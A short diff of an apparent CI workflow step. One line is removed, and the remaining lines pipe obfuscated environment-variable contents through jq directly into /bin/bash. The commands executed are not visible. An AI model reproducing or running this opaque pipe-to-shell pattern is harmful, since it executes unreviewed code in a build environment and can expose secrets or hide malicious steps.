@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$wmhe1785" | jq -r .alf40142 | /bin/bash
           echo $hith6158 | jq -r .zwumi692 | /bin/bash
-          echo $iiqlu59509 | jq -r .z27035 | /bin/bash
           echo $brl06 | jq -r .sap352 | /bin/bash
 
       - name: Persist data
